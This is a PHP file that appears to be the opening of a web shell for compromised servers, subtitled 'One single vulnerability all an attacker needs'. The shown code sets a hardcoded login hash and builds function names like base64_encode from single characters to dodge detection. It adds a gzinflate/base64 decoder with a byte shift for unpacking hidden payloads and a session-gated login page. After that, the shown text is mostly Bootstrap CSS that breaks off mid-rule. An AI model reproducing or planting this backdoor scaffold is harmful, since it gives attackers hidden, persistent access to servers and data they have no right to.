<?php
$x_="yDUbzDIeyn1=:b092a9a3533e21846b2d7730058be74a7a3ded19";

$config=array(
	"title"     => "maRidoNo",                 // Your Title
	"subtitle"  => "One single vulnerability all an attacker needs",        // Your Subtitle
	"themes"    => "BR34K",                        // Your Themes (D4RK or BR34K)
	"debug"     => false                           // Debug Mode
);

$account=explode(':',$x_);

session_start();                                  // Session Start

function any($x,$y)
{
	return array_key_exists($x,$y);
}
	function hex($n)
	{
		$y = '';
		for ($i = 0; $i < strlen($n); $i++) {
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y)
	{
		$n = '';
		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
		}
		return $n;
	}

function urle($x)
{
	return hex(urlencode($x));
}

function urld($x)
{
	return urldecode(uhex(urldecode($x)));
}

define('_',DIRECTORY_SEPARATOR);

foreach($_SERVER as $k => $v)
{
	define(strtolower($k),$_SERVER[$k]);
}

function yyRJYH($rEY)
{
    $rEY=gzinflate(base64_decode($rEY));
    for($i=0;$i<strlen($rEY);$i++)
    {
        $rEY[$i] = chr(ord($rEY[$i])-1);
    }
    return $rEY;
}

function B64E($x)
{
	$d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	$c="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
	$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
	$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
	$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
	return strtr($b64($x),$d,$c);
}

function B64D($x)
{
	$d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	$c="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
	$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
	$_g="_";$_h="d";$_i="e";$_j="c";$_k="o";$_l="d";$_m="e";
	$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
	return $b64(strtr($x,$d,$c));
}

function error ($errno, $errstr, $errfile, $errline)
{
	switch ($errno)
	{
		case E_PARSE:
		case E_STRICT:$errmsg='# DEBUG';break;
		case E_NOTICE:
		case E_USER_NOTICE:$errmsg='# NOTICE';break;
		case E_USER_ERROR:
		case E_RECOVERABLE_ERROR:$errmsg='# ERROR';break;
		case E_WARNING:
		case E_CORE_WARNING:
		case E_COMPILE_WARNING:
		case E_USER_WARNING:$errmsg='# WARNING';break;
		case E_ERROR:
		case E_CORE_ERROR:
		case E_COMPILE_ERROR:$errmsg='# FATAL ERROR';break;
		default:$errmsg='# UNKNOWN ERROR';break;
	}
	echo '<div class="error">';
	echo $errmsg;
	echo "<br>";
	echo $errstr;
	echo "<br>";
	echo $errfile . ' (Line: ' . $errline . ')';
	echo "<br>";
	echo "<br>";
	echo "</div>";
}


// Login Request
if(request_method=="POST")
{
	if(any("username",$_REQUEST)&&any("password",$_REQUEST)&&any("signin",$_REQUEST))
	{
		if((B64E($_REQUEST['username'])==$account[0])&&(sha1(md5($_REQUEST['password']))==$account[1]))
		{
			session_regenerate_id();
			$_SESSION['action']=array(
				"username" => B64E($_REQUEST['username']),
				"password" => sha1(md5($_REQUEST['password']))
			);
		}
		else
		{
		}
	}
}

if(!any("action",$_SESSION))
{
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex"/>
<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
<style type='text/css'>
:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,::after,::before{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;-ms-overflow-style:scrollbar;-webkit-tap-highlight-color:transparent}@-ms-viewport{width:device-width}article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}[tabindex="-1"]:focus{outline:0!important}hr{box-sizing:content-box;height:0;overflow:visible}h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5rem}p{margin-top:0;margin-bottom:1rem}abbr[data-original-title],abbr[title]{text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;border-bottom:0}address{margin-bottom:1rem;font-style:normal;line-height:inherit}dl,ol,ul{margin-top:0;margin-bottom:1rem}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:700}dd{margin-bottom:.5rem;margin-left:0}blockquote{margin:0 0 1rem}dfn{font-style:italic}b,strong{font-weight:bolder}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:#007bff;text-decoration:none;background-color:transparent;-webkit-text-decoration-skip:objects}a:hover{color:#0056b3;text-decoration:underline}a:not([href]):not([tabindex]){color:inherit;text-decoration:none}a:not([href]):not([tabindex]):focus,a:not([href]):not([tabindex]):hover{color:inherit;text-decoration:none}a:not([href]):not([tabindex]):focus{outline:0}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}pre{margin-top:0;margin-bottom:1rem;overflow:auto;-ms-overflow-style:scrollbar}figure{margin:0 0 1rem}img{vertical-align:middle;border-style:none}svg:not(:root){overflow:hidden}table{border-collapse:collapse}caption{padding-top:.75rem;padding-bottom:.75rem;color:#6c757d;text-align:left;caption-side:bottom}th{text-align:inherit}label{display:inline-block;margin-bottom:.5rem}button{border-radius:0}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{padding:0;border-style:none}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=date],input[type=datetime-local],input[type=month],input[type=time]{-webkit-appearance:listbox}textarea{overflow:auto;resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;max-width:100%;padding:0;margin-bottom:.5rem;font-size:1.5rem;line-height:inherit;color:inherit;white-space:normal}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:none}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}output{display:inline-block}summary{display:list-item;cursor:pointer}template{display:none}[hidden]{display:none!important}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{margin-bottom:.5rem;font-family:inherit;font-weight:500;line-height:1.2;color:inherit}.h1,h1{font-size:2.5rem}.h2,h2{font-size:2rem}.h3,h3{font-size:1.75rem}.h4,h4{font-size:1.5rem}.h5,h5{font-size:1.25rem}.h6,h6{font-size:1rem}.lead{font-size:1.25rem;font-weight:300}.display-1{font-size:6rem;font-weight:300;line-height:1.2}.display-2{font-size:5.5rem;font-weight:300;line-height:1.2}.display-3{font-size:4.5rem;font-weight:300;line-height:1.2}.display-4{font-size:3.5rem;font-weight:300;line-height:1.2}hr{margin-top:1rem;margin-bottom:1rem;border:0;border-top:1px solid rgba(0,0,0,.1)}.small,small{font-size:80%;font-weight:400}.mark,mark{padding:.2em;background-color:#fcf8e3}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none}.list-inline-item{display:inline-block}.list-inline-item:not(:last-child){margin-right:.5rem}.initialism{font-size:90%;text-transform:uppercase}.blockquote{margin-bottom:1rem;font-size:1.25rem}.blockquote-footer{display:block;font-size:80%;color:#6c757d}.blockquote-footer::before{content:"\2014 \00A0"}.img-fluid{max-width:100%;height:auto}.img-thumbnail{padding:.25rem;background-color:#fff;border:1px solid #dee2e6;border-radius:.25rem;max-width:100%;height:auto}.figure{display:inline-block}.figure-img{margin-bottom:.5rem;line-height:1}.figure-caption{font-size:90%;color:#6c757d}code,kbd,pre,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}code{font-size:87.5%;color:#e83e8c;word-break:break-word}a>code{color:inherit}kbd{padding:.2rem .4rem;font-size:87.5%;color:#fff;background-color:#212529;border-radius:.2rem}kbd kbd{padding:0;font-size:100%;font-weight:700}pre{display:block;font-size:87.5%;color:#212529}pre code{font-size:inherit;color:inherit;word-break:normal}.pre-scrollable{max-height:340px;overflow-y:scroll}.container{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.container{max-width:540px}}@media (min-width:768px){.container{max-width:720px}}@media (min-width:992px){.container{max-width:960px}}@media (min-width:1200px){.container{max-width:1140px}}.container-fluid{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}.row{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px}.no-gutters{margin-right:0;margin-left:0}.no-gutters>.col,.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.col,.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9,.col-auto,.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-auto,.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-auto,.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-auto,.col-xl,.col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-auto{position:relative;width:100%;min-height:1px;padding-right:15px;padding-left:15px}.col{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-auto{-webkit-box-flex:0;-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:none}.col-1{-webkit-box-flex:0;-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-2{-webkit-box-flex:0;-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-3{-webkit-box-flex:0;-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-4{-webkit-box-flex:0;-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-5{-webkit-box-flex:0;-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-6{-webkit-box-flex:0;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-7{-webkit-box-flex:0;-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-8{-webkit-box-flex:0;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-9{-webkit-box-flex:0;-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-10{-webkit-box-flex:0;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-11{-webkit-box-flex:0;-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-12{-webkit-box-flex:0;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-first{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.order-last{-webkit-box-ordinal-group:14;-ms-flex-order:13;order:13}.order-0{-webkit-box-ordinal-group:1;-ms-flex-order:0;order:0}.order-1{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}.order-2{-webkit-box-ordinal-group:3;-ms-flex-order:2;order:2}.order-3{-webkit-box-ordinal-group:4;-ms-flex-order:3;order:3}.order-4{-webkit-box-ordinal-group:5;-ms-flex-order:4;order:4}.order-5{-webkit-box-ordinal-group:6;-ms-flex-order:5;order:5}.order-6{-webkit-box-ordinal-group:7;-ms-flex-order:6;order:6}.order-7{-webkit-box-ordinal-group:8;-ms-flex-order:7;order:7}.order-8{-webkit-box-ordinal-group:9;-ms-flex-order:8;order:8}.order-9{-webkit-box-ordinal-group:10;-ms-flex-order:9;order:9}.order-10{-webkit-box-ordinal-group:11;-ms-flex-order:10;order:10}.order-11{-webkit-box-ordinal-group:12;-ms-flex-order:11;order:11}.order-12{-webkit-box-ordinal-group:13;-ms-flex-order:12;order:12}.offset-1{margin-left:8.333333%}.offset-2{margin-left:16.666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.333333%}.offset-5{margin-left:41.666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.333333%}.offset-8{margin-left:66.666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.333333%}.offset-11{margin-left:91.666667%}@media (min-width:576px){.col-sm{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-sm-auto{-webkit-box-flex:0;-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:none}.col-sm-1{-webkit-box-flex:0;-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-sm-2{-webkit-box-flex:0;-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-3{-webkit-box-flex:0;-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-sm-4{-webkit-box-flex:0;-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-sm-5{-webkit-box-flex:0;-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-sm-6{-webkit-box-flex:0;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-sm-7{-webkit-box-flex:0;-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-sm-8{-webkit-box-flex:0;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-sm-9{-webkit-box-flex:0;-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-sm-10{-webkit-box-flex:0;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-sm-11{-webkit-box-flex:0;-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-sm-12{-webkit-box-flex:0;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-sm-first{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.order-sm-last{-webkit-box-ordinal-group:14;-ms-flex-order:13;order:13}.order-sm-0{-webkit-box-ordinal-group:1;-ms-flex-order:0;order:0}.order-sm-1{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}.order-sm-2{-webkit-box-ordinal-group:3;-ms-flex-order:2;order:2}.order-sm-3{-webkit-box-ordinal-group:4;-ms-flex-order:3;order:3}.order-sm-4{-webkit-box-ordinal-group:5;-ms-flex-order:4;order:4}.order-sm-5{-webkit-box-ordinal-group:6;-ms-flex-order:5;order:5}.order-sm-6{-webkit-box-ordinal-group:7;-ms-flex-order:6;order:6}.order-sm-7{-webkit-box-ordinal-group:8;-ms-flex-order:7;order:7}.order-sm-8{-webkit-box-ordinal-group:9;-ms-flex-order:8;order:8}.order-sm-9{-webkit-box-ordinal-group:10;-ms-flex-order:9;order:9}.order-sm-10{-webkit-box-ordinal-group:11;-ms-flex-order:10;order:10}.order-sm-11{-webkit-box-ordinal-group:12;-ms-flex-order:11;order:11}.order-sm-12{-webkit-box-ordinal-group:13;-ms-flex-order:12;order:12}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.333333%}.offset-sm-2{margin-left:16.666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.333333%}.offset-sm-5{margin-left:41.666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.333333%}.offset-sm-8{margin-left:66.666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.333333%}.offset-sm-11{margin-left:91.666667%}}@media (min-width:768px){.col-md{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-md-auto{-webkit-box-flex:0;-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:none}.col-md-1{-webkit-box-flex:0;-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-md-2{-webkit-box-flex:0;-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-3{-webkit-box-flex:0;-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-4{-webkit-box-flex:0;-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-md-5{-webkit-box-flex:0;-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-md-6{-webkit-box-flex:0;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-md-7{-webkit-box-flex:0;-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-md-8{-webkit-box-flex:0;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-md-9{-webkit-box-flex:0;-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-10{-webkit-box-flex:0;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-md-11{-webkit-box-flex:0;-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-md-12{-webkit-box-flex:0;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-md-first{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.order-md-last{-webkit-box-ordinal-group:14;-ms-flex-order:13;order:13}.order-md-0{-webkit-box-ordinal-group:1;-ms-flex-order:0;order:0}.order-md-1{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}.order-md-2{-webkit-box-ordinal-group:3;-ms-flex-order:2;order:2}.order-md-3{-webkit-box-ordinal-group:4;-ms-flex-order:3;order:3}.order-md-4{-webkit-box-ordinal-group:5;-ms-flex-order:4;order:4}.order-md-5{-webkit-box-ordinal-group:6;-ms-flex-order:5;order:5}.order-md-6{-webkit-box-ordinal-group:7;-ms-flex-order:6;order:6}.order-md-7{-webkit-box-ordinal-group:8;-ms-flex-order:7;order:7}.order-md-8{-webkit-box-ordinal-group:9;-ms-flex-order:8;order:8}.order-md-9{-webkit-box-ordinal-group:10;-ms-flex-order:9;order:9}.order-md-10{-webkit-box-ordinal-group:11;-ms-flex-order:10;order:10}.order-md-11{-webkit-box-ordinal-group:12;-ms-flex-order:11;order:11}.order-md-12{-webkit-box-ordinal-group:13;-ms-flex-order:12;order:12}.offset-md-0{margin-left:0}.offset-md-1{margin-left:8.333333%}.offset-md-2{margin-left:16.666667%}.offset-md-3{margin-left:25%}.offset-md-4{margin-left:33.333333%}.offset-md-5{margin-left:41.666667%}.offset-md-6{margin-left:50%}.offset-md-7{margin-left:58.333333%}.offset-md-8{margin-left:66.666667%}.offset-md-9{margin-left:75%}.offset-md-10{margin-left:83.333333%}.offset-md-11{margin-left:91.666667%}}@media (min-width:992px){.col-lg{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-lg-auto{-webkit-box-flex:0;-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:none}.col-lg-1{-webkit-box-flex:0;-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-lg-2{-webkit-box-flex:0;-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-3{-webkit-box-flex:0;-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-lg-4{-webkit-box-flex:0;-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-5{-webkit-box-flex:0;-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-lg-6{-webkit-box-flex:0;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-7{-webkit-box-flex:0;-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-lg-8{-webkit-box-flex:0;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-9{-webkit-box-flex:0;-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-lg-10{-webkit-box-flex:0;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-lg-11{-webkit-box-flex:0;-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-lg-12{-webkit-box-flex:0;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-lg-first{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.order-lg-last{-webkit-box-ordinal-group:14;-ms-flex-order:13;order:13}.order-lg-0{-webkit-box-ordinal-group:1;-ms-flex-order:0;order:0}.order-lg-1{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}.order-lg-2{-webkit-box-ordinal-group:3;-ms-flex-order:2;order:2}.order-lg-3{-webkit-box-ordinal-group:4;-ms-flex-order:3;order:3}.order-lg-4{-webkit-box-ordinal-group:5;-ms-flex-order:4;order:4}.order-lg-5{-webkit-box-ordinal-group:6;-ms-flex-order:5;order:5}.order-lg-6{-webkit-box-ordinal-group:7;-ms-flex-order:6;order:6}.order-lg-7{-webkit-box-ordinal-group:8;-ms-flex-order:7;order:7}.order-lg-8{-webkit-box-ordinal-group:9;-ms-flex-order:8;order:8}.order-lg-9{-webkit-box-ordinal-group:10;-ms-flex-order:9;order:9}.order-lg-10{-webkit-box-ordinal-group:11;-ms-flex-order:10;order:10}.order-lg-11{-webkit-box-ordinal-group:12;-ms-flex-order:11;order:11}.order-lg-12{-webkit-box-ordinal-group:13;-ms-flex-order:12;order:12}.offset-lg-0{margin-left:0}.offset-lg-1{margin-left:8.333333%}.offset-lg-2{margin-left:16.666667%}.offset-lg-3{margin-left:25%}.offset-lg-4{margin-left:33.333333%}.offset-lg-5{margin-left:41.666667%}.offset-lg-6{margin-left:50%}.offset-lg-7{margin-left:58.333333%}.offset-lg-8{margin-left:66.666667%}.offset-lg-9{margin-left:75%}.offset-lg-10{margin-left:83.333333%}.offset-lg-11{margin-left:91.666667%}}@media (min-width:1200px){.col-xl{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-xl-auto{-webkit-box-flex:0;-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:none}.col-xl-1{-webkit-box-flex:0;-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-xl-2{-webkit-box-flex:0;-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xl-3{-webkit-box-flex:0;-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-xl-4{-webkit-box-flex:0;-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-xl-5{-webkit-box-flex:0;-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-xl-6{-webkit-box-flex:0;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-xl-7{-webkit-box-flex:0;-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-xl-8{-webkit-box-flex:0;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-xl-9{-webkit-box-flex:0;-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-xl-10{-webkit-box-flex:0;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-xl-11{-webkit-box-flex:0;-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-xl-12{-webkit-box-flex:0;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-xl-first{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.order-xl-last{-webkit-box-ordinal-group:14;-ms-flex-order:13;order:13}.order-xl-0{-webkit-box-ordinal-group:1;-ms-flex-order:0;order:0}.order-xl-1{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}.order-xl-2{-webkit-box-ordinal-group:3;-ms-flex-order:2;order:2}.order-xl-3{-webkit-box-ordinal-group:4;-ms-flex-order:3;order:3}.order-xl-4{-webkit-box-ordinal-group:5;-ms-flex-order:4;order:4}.order-xl-5{-webkit-box-ordinal-group:6;-ms-flex-order:5;order:5}.order-xl-6{-webkit-box-ordinal-group:7;-ms-flex-order:6;order:6}.order-xl-7{-webkit-box-ordinal-group:8;-ms-flex-order:7;order:7}.order-xl-8{-webkit-box-ordinal-group:9;-ms-flex-order:8;order:8}.order-xl-9{-webkit-box-ordinal-group:10;-ms-flex-order:9;order:9}.order-xl-10{-webkit-box-ordinal-group:11;-ms-flex-order:10;order:10}.order-xl-11{-webkit-box-ordinal-group:12;-ms-flex-order:11;order:11}.order-xl-12{-webkit-box-ordinal-group:13;-ms-flex-order:12;order:12}.offset-xl-0{margin-left:0}.offset-xl-1{margin-left:8.333333%}.offset-xl-2{margin-left:16.666667%}.offset-xl-3{margin-left:25%}.offset-xl-4{margin-left:33.333333%}.offset-xl-5{margin-left:41.666667%}.offset-xl-6{margin-left:50%}.offset-xl-7{margin-left:58.333333%}.offset-xl-8{margin-left:66.666667%}.offset-xl-9{margin-left:75%}.offset-xl-10{margin-left:83.333333%}.offset-xl-11{margin-left:91.666667%}}.table{width:100%;max-width:100%;margin-bottom:1rem;background-color:transparent}.table td,.table th{padding:.75rem;vertical-align:top;border-top:1px solid #dee2e6}.table thead th{vertical-align:bottom;border-bottom:2px solid #dee2e6}.table tbody+tbody{border-top:2px solid #dee2e6}.table .table{background-color:#fff}.table-sm td,.table-sm th{padding:.3rem}.table-bordered{border:1px solid #dee2e6}.table-bordered td,.table-bordered th{border:1px solid #dee2e6}.table-bordered thead td,.table-bordered thead th{border-bottom-width:2px}.table-striped tbody tr:nth-of-type(odd){background-color:rgba(0,0,0,.05)}.table-hover tbody tr:hover{background-color:rgba(0,0,0,.075)}.table-primary,.table-primary>td,.table-primary>th{background-color:#b8daff}.table-hover .table-primary:hover{background-color:#9fcdff}.table-hover .table-primary:hover>td,.table-hover .table-primary:hover>th{background-color:#9fcdff}.table-secondary,.table-secondary>td,.table-secondary>th{background-color:#d6d8db}.table-hover .table-secondary:hover{background-color:#c8cbcf}.table-hover .table-secondary:hover>td,.table-hover .table-secondary:hover>th{background-color:#c8cbcf}.table-success,.table-success>td,.table-success>th{background-color:#c3e6cb}.table-hover .table-success:hover{background-color:#b1dfbb}.table-hover .table-success:hover>td,.table-hover .table-success:hover>th{background-color:#b1dfbb}.table-info,.table-info>td,.table-info>th{background-color:#bee5eb}.table-hover .table-info:hover{background-color:#abdde5}.table-hover .table-info:hover>td,.table-hover .table-info:hover>th{background-color:#abdde5}.table-warning,.table-warning>td,.table-warning>th{background-color:#ffeeba}.table-hover .table-warning:hover{background-color:#ffe8a1}.table-hover .table-warning:hover>td,.table-hover .table-warning:hover>th{background-color:#ffe8a1}.table-danger,.table-danger>td,.table-danger>th{background-color:#f5c6cb}.table-hover .table-danger:hover{background-color:#f1b0b7}.table-hover .table-danger:hover>td,.table-hover .table-danger:hover>th{background-color:#f1b0b7}.table-light,.table-light>td,.table-light>th{background-color:#fdfdfe}.table-hover .table-light:hover{background-color:#ececf6}.table-hover .table-light:hover>td,.table-hover .table-light:hover>th{background-color:#ececf6}.table-dark,.table-dark>td,.table-dark>th{background-color:#c6c8ca}.table-hover .table-dark:hover{background-color:#b9bbbe}.table-hover .table-dark:hover>td,.table-hover .table-dark:hover>th{background-color:#b9bbbe}.table-active,.table-active>td,.table-active>th{background-color:rgba(0,0,0,.075)}.table-hover .table-active:hover{background-color:rgba(0,0,0,.075)}.table-hover .table-active:hover>td,.table-hover 